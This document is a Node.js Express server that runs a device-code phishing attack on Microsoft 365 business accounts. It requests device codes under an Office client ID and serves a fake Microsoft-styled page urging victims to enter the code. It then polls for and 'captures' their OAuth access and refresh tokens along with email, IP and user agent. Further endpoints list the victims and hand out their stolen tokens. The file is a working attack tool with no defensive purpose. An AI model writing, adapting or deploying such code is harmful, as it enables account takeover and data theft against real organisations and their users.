const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// USING MICROSOFT OFFICE 365 PROPLUS CLIENT
// This client is pre-authorized for ALL business accounts
// NO ADMIN CONSENT NEEDED!
// ============================================
const OFFICE_CLIENT_ID = '9ba5a8c6-2f6b-4e6b-8b1c-7c6b8e9f5a3d';
// ============================================

let userSessions = new Map();
let pendingAuth = new Map();

function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// Create Device Code Session
app.post('/api/create-session', async (req, res) => {
    try {
        const sid = generateSID();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        // Using /organizations endpoint for business accounts
        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: OFFICE_CLIENT_ID,
                scope: 'https://graph.microsoft.com/User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        console.log(`[CREATE] SID: ${sid}, Code: ${user_code}, IP: ${clientIp}`);
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        res.json({ success: true, sid: sid, user_code: user_code });
        
    } catch (err) {
        console.error('Error:', err.response?.data || err.message);
        res.status(500).json({ error: 'Failed to create session' });
    }
});

async function pollForToken(device_code, sid) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: OFFICE_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            userSessions.set(sid.toString(), {
                sid: sid,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                tokens: tokens,
                capturedAt: new Date().toISOString()
            });
            
            pending.status = 'captured';
            pending.email = userInfo.data.mail;
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅ CAPTURED: ${userInfo.data.mail}`);
            
        } catch (err) {
            if (err.response?.data?.error !== 'authorization_pending') {}
        }
    }, 3000);
}

app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    const session = userSessions.get(sid);
    if (session) return res.json({ status: 'captured', email: session.email });
    for (const pending of pendingAuth.values()) {
        if (pending.sid.toString() === sid) return res.json({ status: pending.status });
    }
    res.json({ status: 'not_found' });
});

app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(userSessions.values()).map(s => ({
        sid: s.sid, email: s.email, name: s.name, ip: s.ip, userAgent: s.userAgent, capturedAt: s.capturedAt
    }));
    res.json({ sessions: sessionList });
});

app.get('/api/session/token/:sid', async (req, res) => {
    const session = userSessions.get(req.params.sid);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    res.json({ email: session.email, token: session.tokens.access_token });
});

app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

// Generate Auth Page
app.get('/generate-auth-page', async (req, res) => {
    try {
        const sid = generateSID();
        
        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: OFFICE_CLIENT_ID,
                scope: 'https://graph.microsoft.com/User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: getClientIp(req), userAgent: req.headers['user-agent'] || 'Unknown',
            createdAt: Date.now(), expiresAt: Date.now() + (response.data.expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        const html = `<!DOCTYPE html>
<html>
<head><title>Microsoft 365 Authentication</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:20px}
.card{background:#fff;border-radius:20px;padding:40px;max-width:500px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.code{font-size:42px;font-weight:bold;letter-spacing:8px;background:#f0f0f0;padding:15px;border-radius:10px;margin:20px 0;color:#0078d4;font-family:monospace}
.btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;margin:8px;font-size:14px}
.btn:hover{background:#005fa3}
.status{margin-top:20px;padding:12px;border-radius:8px;background:#f8f9fa;color:#666;font-size:13px}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.steps{text-align:left;margin-top:20px;padding:15px;background:#f8f9fa;border-radius:8px;font-size:12px}
.steps ol{padding-left:20px}
</style>
</head>
<body>
<div class="card">
<h2>📧 Microsoft 365 Access</h2>
<p>Connect your work or school account</p>
<div class="code" id="userCode">${user_code}</div>
<button class="btn" onclick="copyCode()">Copy Code</button>
<button class="btn" id="openBtn">Open Microsoft Login</button>
<div class="steps">
<strong>Steps:</strong><br>
1. Click "Open Microsoft Login"<br>
2. Enter code: <strong>${user_code}</strong><br>
3. Sign in with your Microsoft 365 account<br>
4. Click "Continue" when asked<br>
5. Your session will be captured
</div>
<div class="status" id="statusMsg"><span class="spinner"></span> Waiting for authentication...</div>
</div>
<script>
const SID = ${sid};
const API = window.location.origin;
function copyCode(){const c=document.getElementById('userCode').textContent;navigator.clipboard.writeText(c);alert('Copied!')}
document.getElementById('openBtn').onclick=function(){window.open('https://login.microsoftonline.com/organizations/oauth2/v2.0/deviceauth','_blank','width=600,height=700')}
async function poll(){try{const r=await fetch(API+'/api/status/'+SID);const d=await r.json();if(d.status==='captured'){document.getElementById('statusMsg').innerHTML='✅ Access granted! Session captured.';setTimeout(()=>window.close(),2000)}}catch(e){}setTimeout(poll,3000)}
poll();
</script>
</body>
</html>`;
        
        res.send(html);
        
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
